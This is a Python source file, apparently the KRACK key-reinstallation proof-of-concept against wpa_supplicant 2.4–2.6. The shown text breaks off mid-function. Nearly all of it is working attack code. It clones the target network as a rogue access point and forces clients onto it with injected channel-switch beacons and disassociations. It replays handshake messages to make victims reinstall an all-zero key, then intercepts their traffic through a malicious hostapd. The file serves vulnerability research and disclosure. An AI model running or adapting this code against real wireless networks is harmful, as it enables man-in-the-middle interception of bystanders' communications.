#!/usr/bin/env python3

# wpa_supplicant v2.4 - v2.6 all-zero encryption key attack
# Copyright (c) 2017, Mathy Vanhoef <Mathy.Vanhoef@cs.kuleuven.be>
#
# This code may be distributed under the terms of the BSD license.
# See README for more details.
import os, sys
sys.path.append(os.path.join(os.path.dirname(os.path.abspath(__file__)), '..', 'scapy'))
from scapy.all import *  # noqa: E402
from scapy.arch.linux import L2Socket, attach_filter

import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

import struct, time, argparse, heapq, subprocess, atexit, select, textwrap
from datetime import datetime
from wpaspy import Ctrl

# Notes:
# - This was tested using scapy 
# - Dependencies: python-scapy (tested using 2.3.3), libnl-3-dev, libnl-genl-3-dev, pkg-config, libssl-dev, net-tools, macchanger
#   * cp defconfig .config
#
# Research:
# - Investigate how to make Atheros ACK all frames, while still allowing frame injection
# - Reuse hostapd/kernel functionality to handle sleeping stations
#
# Optional future features:
# - Option to attack specific client (search network its on, clone that one, and start attack)
#
# TODO:
# - Mention to disable hardware encryption (similar to other attack test tools)
# - Test against enterprise authentication. We will also have to forward EAP frames!
# - Show "-- forwarding" when we haven't confirmed MitM on rouge channel, and "-- MitM'ing" when on rouge channel
# - If EAPOL-Msg4 has been received on the real channel, the MitM attack has failed (maybe deauthenticate then)
# - Detect usage off all-zero key by decrypting frames (so we can miss some frames safely)
# - Handle forwarded messages that are too long (= stupid Linux kernel bug)
# - Prefix Warning or Error messages? What if they are just colored?

IEEE_TLV_TYPE_SSID = 0
IEEE_TLV_TYPE_CHANNEL = 3
IEEE_TLV_TYPE_RSN = 48
IEEE_TLV_TYPE_CSA = 37
IEEE_TLV_TYPE_VENDOR = 221

IEEE80211_RADIOTAP_RATE = (1 << 2)
IEEE80211_RADIOTAP_CHANNEL = (1 << 3)
IEEE80211_RADIOTAP_TX_FLAGS = (1 << 15)
IEEE80211_RADIOTAP_DATA_RETRIES = (1 << 17)

#### Basic output and logging functionality ####

ALL, DEBUG, INFO, STATUS, WARNING, ERROR = range(6)
COLORCODES = {"gray": "\033[0;37m",
              "green": "\033[0;32m",
              "orange": "\033[0;33m",
              "red": "\033[0;31m"}

global_log_level = INFO


def log(level, msg, color=None, showtime=True):
    if level < global_log_level: return
    if level == DEBUG and color is None: color = "gray"
    if level == WARNING and color is None: color = "orange"
    if level == ERROR and color is None: color = "red"
    print((datetime.now().strftime('[%H:%M:%S] ') if showtime else " " * 11) + COLORCODES.get(color,
                                                                                              "") + msg + "\033[1;0m")


#### Packet Processing Functions ####

class MitmSocket(L2Socket):
    def __init__(self, dumpfile=None, strict_echo_test=False, **kwargs):
        super(MitmSocket, self).__init__(**kwargs)
        self.pcap = None
        if dumpfile:
            self.pcap = PcapWriter("%s.%s.pcap" % (dumpfile, self.iface), append=False, sync=True)
        self.strict_echo_test = strict_echo_test

    def set_channel(self, channel):
        subprocess.check_output(["iw", self.iface, "set", "channel", str(channel)])

    def attach_filter(self, bpf):
        log(DEBUG, "Attaching filter to %s: <%s>" % (self.iface, bpf))
        attach_filter(self.ins, bpf, self.iface)

    def send(self, p):
        # Hack: set the More Data flag so we can detect injected frames
        p[Dot11].FCfield |= 0x20
        L2Socket.send(self, RadioTap() / p)
        if self.pcap: self.pcap.write(RadioTap() / p)
        log(DEBUG, "%s: Injected frame %s" % (self.iface, dot11_to_str(p)))

    def _strip_fcs(self, p):
        # Scapy can't handle FCS field automatically
        if p[RadioTap].present & 2 != 0:
            rawframe = str(p[RadioTap])
            pos = 8
            while ord(rawframe[pos - 1]) & 0x80 != 0: pos += 4

            # If the TSFT field is present, it must be 8-bytes aligned
            if p[RadioTap].present & 1 != 0:
                pos += (8 - (pos % 8))
                pos += 8

            # Remove FCS if present
            if ord(rawframe[pos]) & 0x10 != 0:
                return Dot11(str(p[Dot11])[:-4])

        return p[Dot11]

    def recv(self, x=MTU):
        p = L2Socket.recv(self, x)
        if p == None or not Dot11 in p: return None
        if self.pcap: self.pcap.write(p)

        # Don't care about control frames
        if p.type == 1:
            #log(ALL, "%s: ignoring control frame %s" % (self.iface, dot11_to_str(p)))
            log(ALL, "%s: ignoring control frame" % (self.iface))
            return None

        # 1. Radiotap monitor mode header is defined in ieee80211_add_tx_radiotap_header: TX_FLAGS, DATA_RETRIES, [RATE, MCS, VHT, ]
        # 2. Radiotap header for normal received frames is defined in ieee80211_add_rx_radiotap_header: FLAGS, CHANNEL, RX_FLAGS, [...]
        # 3. Beacons generated by hostapd and recieved on virtual interface: TX_FLAGS, DATA_RETRIES
        #
        # Conclusion: if channel flag is not present, but rate flag is included, then this could be an echoed injected frame.
        # Warning: this check fails to detect injected frames captured by the other interface (due to proximity of transmittors and capture effect)
        radiotap_possible_injection = (p[RadioTap].present & IEEE80211_RADIOTAP_CHANNEL == 0) and not (
                    p[RadioTap].present & IEEE80211_RADIOTAP_RATE == 0)

        # Hack: ignore frames that we just injected and are echoed back by the kernel. Note that the More Data flag also
        #	allows us to detect cross-channel frames (received due to proximity of transmissors on different channel)
        if p[Dot11].FCfield & 0x20 != 0 and (not self.strict_echo_test or self.radiotap_possible_injection):
            #log(DEBUG, "%s: ignoring echoed frame %s (0x%02X, present=%08X, strict=%d)" % (
            #self.iface, dot11_to_str(p), p[Dot11].FCfield.value, p[RadioTap].present.value, radiotap_possible_injection))
            log(DEBUG, "%s: ignoring echoed frame" % (self.iface))
            return None
        else:
            log(ALL, "%s: Received frame: %s" % (self.iface, dot11_to_str(p)))

        # Strip the FCS if present, and drop the RadioTap header
        return self._strip_fcs(p)

    def close(self):
        if self.pcap: self.pcap.close()
        super(MitmSocket, self).close()


def call_macchanger(iface, macaddr):
    try:
        subprocess.check_output(["macchanger", "-m", macaddr, iface])
    except subprocess.CalledProcessError as ex:
        if not "It's the same MAC!!" in ex.output.decode('utf-8'):
            raise


def set_mac_address(iface, macaddr):
    subprocess.check_output(["ifconfig", iface, "down"])
    call_macchanger(iface, macaddr)
    subprocess.check_output(["ifconfig", iface, "up"])


def set_monitor_ack_address(iface, macaddr, sta_suffix=None):
    """Add a virtual STA interface for ACK generation. This assumes nothing takes control of this
	   interface, meaning it remains on the current channel."""
    sta_iface = iface + ("sta" if sta_suffix is None else sta_suffix)
    subprocess.call(["iw", sta_iface, "del"], stdout=subprocess.PIPE, stdin=subprocess.PIPE)
    subprocess.check_output(["iw", iface, "interface", "add", sta_iface, "type", "managed"])
    call_macchanger(sta_iface, macaddr)
    subprocess.check_output(["ifconfig", sta_iface, "up"])


def xorstr(lhs, rhs):
    return "".join([chr(ord(lb) ^ ord(rb)) for lb, rb in zip(lhs, rhs)])


def dot11_get_seqnum(p):
    return p[Dot11].SC >> 4


def dot11_get_iv(p):
    """Scapy can't handle Extended IVs, so do this properly ourselves"""
    if Dot11WEP not in p:
        log(ERROR, "INTERNAL ERROR: Requested IV of plaintext frame")
        return 0

    wep = p[Dot11WEP]
    if wep.keyid & 32:
        return ord(wep.iv[0]) + (ord(wep.iv[1]) << 8) + (struct.unpack(">I", wep.wepdata[:4])[0] << 16)
    else:
        return ord(wep.iv[0]) + (ord(wep.iv[1]) << 8) + (ord(wep.iv[2]) << 16)


def dot11_get_tid(p):
    if Dot11QoS in p:
        return ord(str(p[Dot11QoS])[0]) & 0x0F
    return 0


def dot11_is_group(p):
    # TODO: Detect if multicast bit is set in p.addr1
    return p.addr1 == "ff:ff:ff:ff:ff:ff"


def get_eapol_msgnum(p):
    FLAG_PAIRWISE = 0b0000001000
    FLAG_ACK = 0b0010000000
    FLAG_SECURE = 0b1000000000

    if not EAPOL in p: return 0

    keyinfo = bytes(p[EAPOL])[5:7]
    flags = struct.unpack(">H", keyinfo)[0]
    if flags & FLAG_PAIRWISE:
        # 4-way handshake
        if flags & FLAG_ACK:
            # sent by server
            if flags & FLAG_SECURE:
                return 3
            else:
                return 1
        else:
            # sent by server
            # FIXME: use p[EAPOL.load] instead of str(p[EAPOL])
            keydatalen = struct.unpack(">H", bytes(p[EAPOL])[97:99])[0]
            if keydatalen == 0:
                return 4
            else:
                return 2

    return 0


def get_eapol_replaynum(p):
    # FIXME: use p[EAPOL.load] instead of str(p[EAPOL])
    return struct.unpack(">Q", bytes(p[EAPOL])[9:17])[0]


def set_eapol_replaynum(p, value):
    p[EAPOL].load = p[EAPOL].load[:5] + struct.pack(">Q", value) + p[EAPOL].load[13:]
    return p


def dot11_to_str(p):
    EAP_CODE = {1: "Request"}
    EAP_TYPE = {1: "Identity"}
    DEAUTH_REASON = {1: "Unspecified", 2: "Prev_Auth_No_Longer_Valid/Timeout", 3: "STA_is_leaving", 4: "Inactivity",
                     6: "Unexp_Class2_Frame",
                     7: "Unexp_Class3_Frame", 8: "Leaving", 15: "4-way_HS_timeout"}
    dict_or_str = lambda d, v: d.get(v, str(v))
    if p.type == 0:
        if Dot11Beacon in p:     return "Beacon(seq=%d, TSF=%d)" % (dot11_get_seqnum(p), p[Dot11Beacon].timestamp)
        if Dot11ProbeReq in p:   return "ProbeReq(seq=%d)" % dot11_get_seqnum(p)
        if Dot11ProbeResp in p:  return "ProbeResp(seq=%d)" % dot11_get_seqnum(p)
        if Dot11Auth in p:       return "Auth(seq=%d, status=%d)" % (dot11_get_seqnum(p), p[Dot11Auth].status)
        if Dot11Deauth in p:     return "Deauth(seq=%d, reason=%s)" % (
        dot11_get_seqnum(p), dict_or_str(DEAUTH_REASON, p[Dot11Deauth].reason))
        if Dot11AssoReq in p:    return "AssoReq(seq=%d)" % dot11_get_seqnum(p)
        if Dot11ReassoReq in p:  return "ReassoReq(seq=%d)" % dot11_get_seqnum(p)
        if Dot11AssoResp in p:   return "AssoResp(seq=%d, status=%d)" % (dot11_get_seqnum(p), p[Dot11AssoResp].status)
        if Dot11ReassoResp in p: return "ReassoResp(seq=%d, status=%d)" % (
        dot11_get_seqnum(p), p[Dot11ReassoResp].status)
        if Dot11Disas in p:      return "Disas(seq=%d)" % dot11_get_seqnum(p)
        if p.subtype == 13:      return "Action(seq=%d)" % dot11_get_seqnum(p)
    elif p.type == 1:
        if p.subtype == 9:      return "BlockAck"
        if p.subtype == 11:      return "RTS"
        if p.subtype == 13:      return "Ack"
    elif p.type == 2:
        if Dot11WEP in p:        return "EncryptedData(seq=%d, IV=%d)" % (dot11_get_seqnum(p), dot11_get_iv(p))
        if p.subtype == 4:       return "Null(seq=%d, sleep=%d)" % (dot11_get_seqnum(p), p.FCfield & 0x10 != 0)
        if p.subtype == 12:      return "QoS-Null(seq=%d, sleep=%d)" % (dot11_get_seqnum(p), p.FCfield & 0x10 != 0)
        if EAPOL in p:
            if get_eapol_msgnum(p) != 0:
                return "EAPOL-Msg%d(seq=%d,replay=%d)" % (
                get_eapol_msgnum(p), dot11_get_seqnum(p), get_eapol_replaynum(p))
            elif EAP in p:
                return "EAP-%s,%s(seq=%d)" % (
                dict_or_str(EAP_CODE, p[EAP].code), dict_or_str(EAP_TYPE, p[EAP].type), dot11_get_seqnum(p))
            else:
                return repr(p)
    return repr(p)


def construct_csa(channel, count=1):
    switch_mode = 1  # STA should not Tx untill switch is completed
    new_chan_num = channel  # Channel it should switch to
    switch_count = count  # Immediately make the station switch

    # Contruct the IE
    payload = struct.pack("<BBB", switch_mode, new_chan_num, switch_count)
    return Dot11Elt(ID=IEEE_TLV_TYPE_CSA, info=payload)


def append_csa(p, channel, count=1):
    p = p.copy()

    el = p[Dot11Elt]
    prevel = None
    while isinstance(el, Dot11Elt):
        prevel = el
        el = el.payload

    prevel.payload = construct_csa(channel, count)

    return p


def get_tlv_value(p, type):
    if not Dot11Elt in p: return None
    el = p[Dot11Elt]
    while isinstance(el, Dot11Elt):
        if el.ID == type:
            return el.info
        el = el.payload
    return None


#### Man-in-the-middle Code ####

def print_rx(level, name, p, color=None, suffix=None):
    if p[Dot11].type == 1: return
    if color is None and (Dot11Deauth in p or Dot11Disas in p): color = "orange"
    log(level, "%s: %s -> %s: %s%s" % (name, p.addr2, p.addr1, dot11_to_str(p), suffix if suffix else ""), color=color)


class NetworkConfig():
    def __init__(self):
        self.ssid = None
        self.real_channel = None
        self.group_cipher = None
        self.wpavers = 0
        self.pairwise_ciphers = set()
        self.akms = set()
        self.wmmenabled = 0
        self.capab = 0

    def is_wparsn(self):
        return not self.group_cipher is None and self.wpavers > 0 and \
            len(self.pairwise_ciphers) > 0 and len(self.akms) > 0

    # TODO: Improved parsing to handle more networks
    def parse_wparsn(self, wparsn):
        self.group_cipher = wparsn[5]

        num_pairwise = struct.unpack("<H", wparsn[6:8])[0]
        pos = wparsn[8:]
        for i in range(num_pairwise):
            self.pairwise_ciphers.add(pos[3])
            pos = pos[4:]

        num_akm = struct.unpack("<H", pos[:2])[0]
        pos = pos[2:]
        for i in range(num_akm):
            self.akms.add(pos[3])
            pos = pos[4:]

        if len(pos) >= 2:
            self.capab = struct.unpack("<H", pos[:2])[0]

    def from_beacon(self, p):
        el = p[Dot11Elt]
        while isinstance(el, Dot11Elt):
            if el.ID == IEEE_TLV_TYPE_SSID:
                self.ssid = el.info
            elif el.ID == IEEE_TLV_TYPE_CHANNEL:
                self.real_channel = el.info[0]
            elif el.ID == IEEE_TLV_TYPE_RSN:
                self.parse_wparsn(el.info)
                self.wpavers |= 2
            elif el.ID == IEEE_TLV_TYPE_VENDOR and el.info[:4] == "\x00\x50\xf2\x01":
                self.parse_wparsn(el.info[4:])
                self.wpavers |= 1
            elif el.ID == IEEE_TLV_TYPE_VENDOR and el.info[:4] == "\x00\x50\xf2\x02":
                self.wmmenabled = 1

            el = el.payload

    # TODO: Check that there also isn't a real AP of this network on
    # the returned channel (possible for large networks e.g. eduroam).
    def find_rogue_channel(self):
        self.rogue_channel = 1 if self.real_channel >= 6 else 11

    def write_config(self, iface):
        TEMPLATE = """
ctrl_interface=hostapd_ctrl
ctrl_interface_group=0

interface={iface}
ssid={ssid}
channel={channel}

wpa={wpaver}
wpa_key_mgmt={akms}
wpa_pairwise={pairwise}
rsn_pairwise={pairwise}
rsn_ptksa_counters={ptksa_counters}
rsn_gtksa_counters={gtksa_counters}

wmm_enabled={wmmenabled}
wmm_advertised={wmmadvertised}
hw_mode=g
auth_algs=3
wpa_passphrase=XXXXXXXX"""
        akm2str = {2: "WPA-PSK", 1: "WPA-EAP"}
        ciphers2str = {2: "TKIP", 4: "CCMP"}
        return TEMPLATE.format(
            iface=iface,
            ssid=self.ssid,
            channel=self.rogue_channel,
            wpaver=self.wpavers,
            akms=" ".join([akm2str[idx] for idx in self.akms]),
            pairwise=" ".join([ciphers2str[idx] for idx in self.pairwise_ciphers]),
            ptksa_counters=(self.capab & 0b001100) >> 2,
            gtksa_counters=(self.capab & 0b110000) >> 4,
            wmmadvertised=int(args.group),
            wmmenabled=self.wmmenabled)


class ClientState():
    Initializing, Connecting, GotMitm, Attack_Started, Success_Reinstalled, Success_AllzeroKey, Failed = range(7)

    def __init__(self, macaddr):
        self.macaddr = macaddr
        self.reset()

    def reset(self):
        self.state = ClientState.Initializing
        self.keystreams = dict()
        self.attack_max_iv = None
        self.attack_time = None

        self.assocreq = None
        self.msg1 = None
        self.msg3s = []
        self.msg4 = None
        self.krack_finished = False

    def store_msg1(self, msg1):
        self.msg1 = msg1

    def add_if_new_msg3(self, msg3):
        if get_eapol_replaynum(msg3) in [get_eapol_replaynum(p) for p in self.msg3s]:
            return
        self.msg3s.append(msg3)

    def update_state(self, state):
        log(DEBUG, "Client %s moved to state %d" % (self.macaddr, state), showtime=False)
        self.state = state

    def mark_got_mitm(self):
        if self.state <= ClientState.Connecting:
            self.state = ClientState.GotMitm
            log(STATUS, "Established MitM position against client %s (moved to state %d)" % (self.macaddr, self.state),
                color="green", showtime=False)

    def is_state(self, state):
        return self.state == state

    # TODO: Also forward when attack has failed?
    def should_forward(self, p):
        if args.group:
            # Forwarding rules when attacking the group handshake
            return True

        else:
            # Forwarding rules when attacking the 4-way handshake
            if self.state in [ClientState.Connecting, ClientState.GotMitm, ClientState.Attack_Started]:
                # Also forward Action frames (e.g. Broadcom AP waits for ADDBA Request/Response before starting 4-way HS).
                return Dot11Auth in p or Dot11AssoReq in p or Dot11AssoResp in p or (
                            1 <= get_eapol_msgnum(p) and get_eapol_msgnum(p) <= 3) \
                    or (p.type == 0 and p.subtype == 13)
            return self.state in [ClientState.Success_Reinstalled]

    def save_iv_keystream(self, iv, keystream):
        self.keystreams[iv] = keystream

    def get_keystream(self, iv):
        return self.keystreams[iv]

    def attack_start(self):
        self.attack_max_iv = 0 if len(self.keystreams.keys()) == 0 else max(self.keystreams.keys())
        self.attack_time = time.time()
        self.update_state(ClientState.Attack_Started)

    def is_iv_reused(self, iv):
        return self.is_state(ClientState.Attack_Started) and iv in self.keystreams

    def attack_timeout(self, iv):
        return self.is_state(
            ClientState.Attack_Started) and self.attack_time + 1.5 < time.time() and self.attack_max_iv < iv


class KRAckAttack():
    def __init__(self, nic_real, nic_rogue_ap, nic_rogue_mon, ssid, clientmac=None, dumpfile=None, cont_csa=False):
        self.nic_real = nic_real
        self.nic_real_clientack = None
        self.nic_rogue_ap = nic_rogue_ap
        self.nic_rogue_mon = nic_rogue_mon
        self.dumpfile = dumpfile
        self.ssid = ssid
        self.beacon = None
        self.apmac = None
        self.netconfig = None
        self.hostapd = None
        self.hostapd_log = None

        # This is set in case of targeted attacks
        self.clientmac = None if clientmac is None else clientmac.replace("-", ":").lower()

        self.sock_real = None
        self.sock_rogue = None
        self.clients = dict()
        self.disas_queue = []
        self.continuous_csa = cont_csa

        # To monitor wether interfaces are (still) on the proper channels
        self.last_real_beacon = None
        self.last_rogue_beacon = None

        # To attack/test the group key handshake
        self.group1 = []
        self.time_forward_group1 = None

    def hostapd_rx_mgmt(self, p):
        log(DEBUG, "Sent frame to hostapd: %s" % dot11_to_str(p))
        self.hostapd_ctrl.request("RX_MGMT " + str(p[Dot11]).encode("hex"))

    def hostapd_add_sta(self, macaddr):
        log(DEBUG, "Forwarding auth to rouge AP to register client", showtime=False)
        self.hostapd_rx_mgmt(Dot11(addr1=self.apmac, addr2=macaddr, addr3=self.apmac) / Dot11Auth(seqnum=1))

    def hostapd_finish_4way(self, stamac):
        log(DEBUG, "Sent frame to hostapd: finishing 4-way handshake of %s" % stamac)
        self.hostapd_ctrl.request("FINISH_4WAY %s" % stamac)

    def find_beacon(self, ssid):
        beacon_p = None
        ps = sniff(count=3, timeout=0.3,
                   lfilter=lambda p: Dot11Beacon in p,
                   opened_socket=self.sock_real)
        for p in ps:
            if(get_tlv_value(p, IEEE_TLV_TYPE_SSID).decode('utf-8') == ssid):
                beacon_p = p
                break;
        if not beacon_p:
            log(STATUS, "Searching for target network on other channels")
            for chan in [1, 6, 11, 3, 8, 2, 7, 4, 10, 5, 9, 12, 13]:
                self.sock_real.set_channel(chan)
                log(DEBUG, "Listening on channel %d" % chan)
                ps = sniff(count=3, timeout=0.3,
                   lfilter=lambda p: Dot11Beacon in p,
                   opened_socket=self.sock_real)
                for p in ps:
                    if(ord(get_tlv_value(p, IEEE_TLV_TYPE_CHANNEL)) == chan and get_tlv_value(p, IEEE_TLV_TYPE_SSID).decode('utf-8') == ssid):
                        beacon_p = p
                        break;

        if beacon_p:
            print("Successfully found the target network <%s>'s beacon frame!" % ssid)
            actual_chan = ord(get_tlv_value(beacon_p, IEEE_TLV_TYPE_CHANNEL))
            self.sock_real.set_channel(actual_chan)
            self.beacon = beacon_p
            self.apmac = self.beacon.addr2

    def send_csa_beacon(self, numbeacons=1, target=None, silent=False):
        newchannel = self.netconfig.rogue_channel
        beacon = self.beacon.copy()
        if target: beacon.addr1 = target

        for i in range(numbeacons):
            # Note: Intel firmware requires first receiving a CSA beacon with a count of 2 or higher,
            # followed by one with a value of 1. When starting with 1 it errors out.
            csabeacon = append_csa(beacon, newchannel, 2)
            self.sock_real.send(csabeacon)

            csabeacon = append_csa(beacon, newchannel, 1)
            self.sock_real.send(csabeacon)

        if not silent: log(STATUS,
                           "Injected %d CSA beacon pairs (moving stations to channel %d)" % (numbeacons, newchannel),
                           color="green")

    def send_disas(self, macaddr):
        p = Dot11(addr1=macaddr, addr2=self.apmac, addr3=self.apmac) / Dot11Disas(reason=0)
        self.sock_rogue.send(p)
        log(STATUS, "Rogue channel: injected Disassociation to %s" % macaddr, color="green")

    def queue_disas(self, macaddr):
        if macaddr in [macaddr for shedtime, macaddr in self.disas_queue]: return
        heapq.heappush(self.disas_queue, (time.time() + 0.5, macaddr))

    def try_channel_switch(self, macaddr):
        self.send_csa_beacon()
        self.queue_disas(macaddr)

    def hostapd_add_allzero_client(self, client):
        if client.assocreq is None:
            log(ERROR,
                "Didn't receive AssocReq of client %s, unable to let rogue hostapd handle client." % client.macaddr)
            return False

        # 1. Add the client to hostapd
        self.hostapd_add_sta(client.macaddr)

        # 2. Inform hostapd of the encryption algorithm and options the client uses
        self.hostapd_rx_mgmt(client.assocreq)

        # 3. Send the EAPOL msg4 to trigger installation of all-zero key by the modified hostapd
        self.hostapd_finish_4way(client.macaddr)

        return True

    def handle_to_client_pairwise(self, client, p):
        if args.group: return False

        eapolnum = get_eapol_msgnum(p)
        if eapolnum == 1 and client.state in [ClientState.Connecting, ClientState.GotMitm]:
            log(DEBUG, "Storing msg1")
            client.store_msg1(p)
        elif eapolnum == 3 and client.state in [ClientState.Connecting, ClientState.GotMitm]:
            client.add_if_new_msg3(p)
            # FIXME: This may cause a timeout on the client side???
            if len(client.msg3s) >= 2:
                log(STATUS, "Got 2nd unique EAPOL msg3. Will forward both these Msg3's seperated by a forged msg1.",
                    color="green", showtime=False)
                log(STATUS, "==> Performing key reinstallation attack!", color="green", showtime=False)

                # FIXME: Warning if msg1 was not detected. Or generate it ourselves.
                packet_list = client.msg3s
                p = set_eapol_replaynum(client.msg1, get_eapol_replaynum(packet_list[0]) + 1)
                packet_list.insert(1, p)

                for p in packet_list: self.sock_rogue.send(p)
                client.msg3s = []

                # TODO: Should extra stuff be done here? Forward msg4 to real AP?
                client.attack_start()
            else:
                log(STATUS, "Not forwarding EAPOL msg3 (%d unique now queued)" % len(client.msg3s), color="green",
                    showtime=False)

            return True

        return False

    def handle_from_client_pairwise(self, client, p):
        if args.group: return

        # Note that scapy incorrectly puts Extended IV into wepdata field, so skip those four bytes
        plaintext = "\xaa\xaa\x03\x00\x00\x00"
        encrypted = p[Dot11WEP].wepdata[4:4 + len(plaintext)]
        keystream = xorstr(plaintext, encrypted)

        iv = dot11_get_iv(p)
        if iv <= 1: log(DEBUG, "Ciphertext: " + encrypted.encode("hex"), showtime=False)

        # FIXME:
        # - The reused IV could be one we accidently missed due to high traffic!!!
        # - It could be a retransmitted packet
        if client.is_iv_reused(iv):
            # If the same keystream is reused, we have a normal key reinstallation attack
            if keystream == client.get_keystream(iv):
                log(STATUS, "SUCCESS! Nonce and keystream reuse detected (IV=%d)." % iv, color="green", showtime=False)
                client.update_state(ClientState.Success_Reinstalled)

                # TODO: Confirm that the handshake now indeed completes. FIXME: Only if we have a msg4?
                self.sock_real.send(client.msg4)

            # Otherwise the client likely installed a new key, i.e., probably an all-zero key
            else:
                # TODO: We can explicitly try to decrypt it using an all-zero key
                log(STATUS, "SUCCESS! Nonce reuse detected (IV=%d), with usage of all-zero encryption key." % iv,
                    color="green", showtime=False)
                log(STATUS, "Now MitM'ing the victim using our malicious AP, and interceptig its traffic.",
                    color="green", showtime=False)

                self.hostapd_add_allzero_client(client)

                # The client is now no longer MitM'ed by this script (i.e. no frames forwarded between channels)
                client.update_state(ClientState.Success_AllzeroKey)

        elif client.attack_timeout(iv):
            log(WARNING, "KRAck Attack against %s seems to have failed" % client.macaddr)
            client.update_state(ClientState.Failed)

        client.save_iv_keystream(iv, keystream)

    def handle_to_client_groupkey(self, client, p):
        if not args.group: return False

        # Does this look like a group key handshake frame -- FIXME do not hardcode the TID
        if Dot11WEP in p and p.addr2 == self.apmac and p.addr3 == self.apmac and dot11_get_tid(p) == 7:
            # TODO: Detect that it's not a retransmission
            self.group1.append(p)
            log(STATUS, "Queued %s group message 1's" % len(self.group1), showtime=False)
            if len(self.group1) == 2:
                log(STATUS, "Forwarding first group1 message", showtime=False)
                self.sock_rogue.send(self.group1.pop(0))

                self.time_forward_group1 = time.time() + 3

            return True
        return False

    def handle_from_client_groupkey(self, client, p):
        if not args.group: return

        # Does this look like a group key handshake frame -- FIXME do not hardcode the TID
        if Dot11WEP in p and p.addr1 == self.apmac and p.addr3 == self.apmac and dot11_get_tid(p) == 7:
            log(STATUS, "Got a likely group message 2", showtime=False)

    def handle_rx_realchan(self):
        p = self.sock_real.recv()
        if p == None: return

        # 1. Handle frames sent TO the real AP
        if p.addr1 == self.apmac:
            # If it's an authentication to the real AP, always display it ...
            if Dot11Auth in p:
                print_rx(INFO, "Real channel ", p, color="orange")

                # ... with an extra clear warning when we wanted to MitM this specific client
                if self.clientmac == p.addr2:
                    log(WARNING,
                        "Client %s is connecting on real channel, injecting CSA beacon to try to correct." % self.clientmac)

                if p.addr2 in self.clients: del self.clients[p.addr2]
                # Send one targeted beacon pair (should be retransmitted in case of failure), and one normal broadcast pair
                self.send_csa_beacon(target=p.addr2)
                self.send_csa_beacon()
                self.clients[p.addr2] = ClientState(p.addr2)
                self.clients[p.addr2].update_state(ClientState.Connecting)

            # Remember association request to save connection parameters
            elif Dot11AssoReq in p:
                if p.addr2 in self.clients: self.clients[p.addr2].assocreq = p

            # Clients sending a deauthentication or disassociation to the real AP are also interesting ...
            elif Dot11Deauth in p or Dot11Disas in p:
                print_rx(INFO, "Real channel ", p)
                if p.addr2 in self.clients: del self.clients[p.addr2]

            # Display all frames sent from a MitM'ed client
            elif p.addr2 in self.clients:
                print_rx(INFO, "Real channel ", p)

            # For all other frames, only display them if they come from the targeted client
            elif self.clientmac is not None and self.clientmac == p.addr2:
                print_rx(INFO, "Real channel ", p)

            # Prevent the AP from thinking clients that are connecting are sleeping, until attack completed or failed
            if p.FCfield & 0x10 != 0 and p.addr2 in self.clients and self.clients[
                p.addr2].state <= ClientState.Attack_Started:
                log(WARNING,
                    "Injecting Null frame so AP thinks client %s is awake (attacking sleeping clients is not fully supported)" % p.addr2)
                self.sock_real.send(Dot11(type=2, subtype=4, addr1=self.apmac, addr2=p.addr2, addr3=self.apmac))


        # 2. Handle frames sent BY the real AP
        elif p.addr2 == self.apmac:
            # Track time of last beacon we received. Verify channel to assure it's not the rogue AP.
            if Dot11Beacon in p and ord(get_tlv_value(p, IEEE_TLV_TYPE_CHANNEL)) == self.netconfig.real_channel:
                self.last_real_beacon = time.time()

            # Decide whether we will (eventually) forward it
            might_forward = p.addr1 in self.clients and self.clients[p.addr1].should_forward(p)
            might_forward = might_forward or (args.group and dot11_is_group(p) and Dot11WEP in p)

            # Pay special attention to Deauth and Disassoc frames
            if Dot11Deauth in p or Dot11Disas in p:
                print_rx(INFO, "Real channel ", p, suffix=" -- MitM'ing" if might_forward else None)
            # If targeting a specific client, display all frames it sends
            elif self.clientmac is not None and self.clientmac == p.addr1:
                print_rx(INFO, "Real channel ", p, suffix=" -- MitM'ing" if might_forward else None)
            # For other clients, just display what might be forwarded
            elif might_forward:
                print_rx(INFO, "Real channel ", p, suffix=" -- MitM'ing")

            # Now perform actual actions that need to be taken, along with additional output
            if might_forward:
                # Unicast frames to clients
                if p.addr1 in self.clients:
                    client = self.clients[p.addr1]

                    # Note: could be that client only switching to rogue channel before receiving Msg3 and sending Msg4
                    if self.handle_to_client_pairwise(client, p):
                        pass

                    elif self.handle_to_client_groupkey(client, p):
                        pass

                    elif Dot11Deauth in p:
                        del self.clients[p.addr1]
                        self.sock_rogue.send(p)

                    else:
                        self.sock_rogue.send(p)

                # Group addressed frames
                else:
                    self.sock_rogue.send(p)

        # 3. Always display all frames sent by or to the targeted client
        elif p.addr1 == self.clientmac or p.addr2 == self.clientmac:
            print_rx(INFO, "Real channel ", p)

    def handle_rx_roguechan(self):
        p = self.sock_rogue.recv()
        if p == None: return

        # 1. Handle frames sent BY the rouge AP
        if p.addr2 == self.apmac:
            # Track time of last beacon we received. Verify channel to assure it's not the real AP.
            if Dot11Beacon in p and ord(get_tlv_value(p, IEEE_TLV_TYPE_CHANNEL)) == self.netconfig.rogue_channel:
                self.last_rogue_beacon = time.time()
            # Display all frames sent to the targeted client
            if self.clientmac is not None and p.addr1 == self.clientmac:
                print_rx(INFO, "Rogue channel", p)
            # And display all frames sent to a MitM'ed client
            elif p.addr1 in self.clients:
                print_rx(INFO, "Rogue channel", p)

        # 2. Handle frames sent TO the AP
        elif p.addr1 == self.apmac:
            client = None

            # Check if it's a new client that we can MitM
            if Dot11Auth in p:
                print_rx(INFO, "Rogue channel", p, suffix=" -- MitM'ing")
                self.clients[p.addr2] = ClientState(p.addr2)
                self.clients[p.addr2].mark_got_mitm()
                client = self.clients[p.addr2]
                will_forward = True
            # Otherwise check of it's an existing client we are tracking/MitM'ing
            elif p.addr2 in self.clients:
                client = self.clients[p.addr2]
                will_forward = client.should_forward(p)
                print_rx(INFO, "Rogue channel", p, suffix=" -- MitM'ing" if will_forward else None)
            # Always display all frames sent by the targeted client
            elif p.addr2 == self.clientmac:
                print_rx(INFO, "Rogue channel", p)

            # If this now belongs to a client we want to track, process the packet further
            if client is not None:
                # Save the association request so we can track the encryption algorithm and options the client uses
                if Dot11AssoReq in p: client.assocreq = p
                # Save msg4 so we can complete the handshake once we attempted a key reinstallation attack
                if get_eapol_msgnum(p) == 4: client.msg4 = p

                # Client is sending on rogue channel, we got a MitM position =)
                client.mark_got_mitm()

                if Dot11WEP in p:
                    # Use encrypted frames to determine if the key reinstallation attack succeeded
                    self.handle_from_client_pairwise(client, p)
                    self.handle_from_client_groupkey(client, p)

                if will_forward:
                    # Don't mark client as sleeping when we haven't got two Msg3's and performed the attack
                    if client.state < ClientState.Attack_Started:
